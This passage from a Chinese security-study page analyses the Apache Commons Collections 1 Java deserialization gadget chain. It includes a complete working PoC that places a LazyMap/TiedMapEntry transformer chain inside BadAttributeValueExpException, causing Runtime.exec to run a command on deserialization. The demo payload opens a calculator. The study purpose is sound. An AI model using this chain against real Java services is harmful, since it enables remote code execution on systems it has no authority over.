<p>可以看到第三个if分支里调用了<code>valObj.toString()</code>,而<code>valObj=gf.get(&quot;val&quot;, null)</code>,这里其实就是读取传过来对象的<code>val</code>属性值，所以，<strong>只要我们控制<code>BadAttributeValueExpException</code>对象的<code>val属性</code>的值为我们精心构造的<code>TiedMapEntry</code>对象就行</strong>。所以，就有了下面的poc:</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.Transformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.ChainedTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.ConstantTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.functors.InvokerTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.map.LazyMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.management.BadAttributeValueExpException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.xml.ws.Action;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.*;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.*;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Arrays;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.HashMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Map;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchFieldException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(String.class.isInstance(&quot;&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 利用链</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer[] transformers = new Transformer[]{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new ConstantTransformer(Runtime.class),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -na Calculator&quot;})</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map innerMap = new HashMap();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        innerMap.put(&quot;123&quot;, 1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 将lazyMap封装到TiedMapEntry中</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;456&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 通过反射给badAttributeValueExpException的val属性赋值</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Field val = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        val.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 序列化</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        objectOutputStream.close();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray()));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 模拟目标进行反序列化</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        objectInputStream.readObject();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210805173302511" src="/assets/images/image-20210805173302511-481ae94e010a9e1c63b9625126c46af5.png" width="2300" height="1224" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="参考">参考<a href="#参考" class="hash-link" aria-label="参考的直接链接" title="参考的直接链接">​</a></h3>
<ul>
<li><a href="https://www.freebuf.com/vuls/175252.html" target="_blank" rel="noopener noreferrer">Apache-Commons-Collections反序列化漏洞分析</a></li>
<li><a href="https://www.cnblogs.com/nice0e3/p/13758664.html" target="_blank" rel="noopener noreferrer">Java安全之Commons Collections1分析前置知识</a></li>
<li><a href="https://ca01h.top/Java/javasec/5.ysoserial%20CC1%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/" target="_blank" rel="noopener noreferrer">Java安全学习之ysoserial CommonsCollections1详细分析</a></li>
<li><a href="http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener noreferrer">java-cc1-反序列化简单分析</a></li>
<li><a href="https://xz.aliyun.com/t/7031" target="_blank" rel="noopener noreferrer">JAVA反序列化 - Commons-Collections组件</a></li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-14T03:28:33.000Z" itemprop="dateModified">2025年6月14日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/category/反序列化链分析"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">反序列化链分析</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/代码审计/Java安全/反序列化链分析/URLDNS链分析"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">URLDNS链分析</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#基础使用" class="table-of-contents__link toc-highlight">基础使用</a><ul><li><a href="#背景介绍" class="table-of-contents__link toc-highlight">背景介绍</a></li><li><a href="#主要特点" class="table-of-contents__link toc-highlight">主要特点</a></li><li><a href="#包结构介绍" class="table-of-contents__link toc-highlight">包结构介绍</a></li><li><a href="#引入依赖" class="table-of-contents__link toc-highlight">引入依赖</a></li><li><a href="#使用介绍" class="table-of-contents__link toc-highlight">使用介绍</a><ul><li><a href="#通用集合-bag" class="table-of-contents__link toc-highlight">通用集合 Bag</a></li><li><a href="#通用集合-bidimap" class="table-of-contents__link toc-highlight">通用集合 BidiMap</a></li><li><a href="#通用集合-mapiterator" class="table-of-contents__link toc-highlight">通用集合 MapIterator</a></li><li><a href="#通用集合-orderedmap" class="table-of-contents__link toc-highlight">通用集合 OrderedMap</a></li><li><a href="#集合工具类-collectionutils" class="table-of-contents__link toc-highlight">集合工具类 CollectionUtils</a><ul><li><a href="#检查是否为空元素" class="table-of-contents__link toc-highlight">检查是否为空元素</a></li><li><a href="#合并两个排序列表" class="table-of-contents__link toc-highlight">合并两个排序列表</a></li><li><a href="#转换列表" class="table-of-contents__link toc-highlight">转换列表</a></li><li><a href="#过滤列表" class="table-of-contents__link toc-highlight">过滤列表</a></li><li><a href="#检查非空列表" class="table-of-contents__link toc-highlight">检查非空列表</a></li><li><a href="#检查空的列表" class="table-of-contents__link toc-highlight">检查空的列表</a></li><li><a href="#检查子列表" class="table-of-contents__link toc-highlight">检查子列表</a></li><li><a href="#检查相交" class="table-of-contents__link toc-highlight">检查相交</a></li><li><a href="#求差集" class="table-of-contents__link toc-highlight">求差集</a></li><li><a href="#求联合集" class="table-of-contents__link toc-highlight">求联合集</a></li></ul></li></ul></li><li><a href="#参考教程" class="table-of-contents__link toc-highlight">参考教程</a></li></ul></li><li><a href="#commons-collections1-分析" class="table-of-contents__link toc-highlight">Commons Collections1 分析</a><ul><li><a href="#前言" class="table-of-contents__link toc-highlight">前言</a></li><li><a href="#前置知识" class="table-of-contents__link toc-highlight">前置知识</a><ul><li><a href="#poc示例" class="table-of-contents__link toc-highlight">POC示例</a></li><li><a href="#transformer" class="table-of-contents__link toc-highlight">Transformer</a></li><li><a href="#constanttransformer" class="table-of-contents__link toc-highlight">ConstantTransformer</a></li><li><a href="#invokertransformer️" class="table-of-contents__link toc-highlight">InvokerTransformer‼️</a></li><li><a href="#chainedtransformer️" class="table-of-contents__link toc-highlight">ChainedTransformer‼️</a></li><li><a href="#几个transformer实现类整理" class="table-of-contents__link toc-highlight">几个Transformer实现类整理</a></li><li><a href="#map" class="table-of-contents__link toc-highlight">Map</a></li><li><a href="#transformedmap️" class="table-of-contents__link toc-highlight">TransformedMap‼️</a></li><li><a href="#mapentry" class="table-of-contents__link toc-highlight">Map.Entry</a></li></ul></li><li><a href="#反射exec" class="table-of-contents__link toc-highlight">反射exec</a><ul><li><a href="#反射利用链" class="table-of-contents__link toc-highlight">反射利用链</a></li><li><a href="#简化链" class="table-of-contents__link toc-highlight">简化链</a></li></ul></li><li><a href="#使用annotationinvocationhandler触发反序列化" class="table-of-contents__link toc-highlight">使用AnnotationInvocationHandler触发反序列化</a><ul><li><a href="#分析" class="table-of-contents__link toc-highlight">分析</a></li><li><a href="#poc构建过程" class="table-of-contents__link toc-highlight">POC构建过程</a></li><li><a href="#完整poc" class="table-of-contents__link toc-highlight">完整POC</a></li><li><a href="#整体思路" class="table-of-contents__link toc-highlight">整体思路</a></li></ul></li><li><a href="#使用lazymap利用链" class="table-of-contents__link toc-highlight">使用LazyMap利用链</a><ul><li><a href="#介绍" class="table-of-contents__link toc-highlight">介绍</a></li><li><a href="#动态代理复习" class="table-of-contents__link toc-highlight">动态代理复习</a></li><li><a href="#构建poc" class="table-of-contents__link toc-highlight">构建POC</a></li><li><a href="#完整poc-1" class="table-of-contents__link toc-highlight">完整POC</a></li><li><a href="#lazymap利用链补充" class="table-of-contents__link toc-highlight">LazyMap利用链补充</a></li></ul></li><li><a href="#参考" class="table-of-contents__link toc-highlight">参考</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>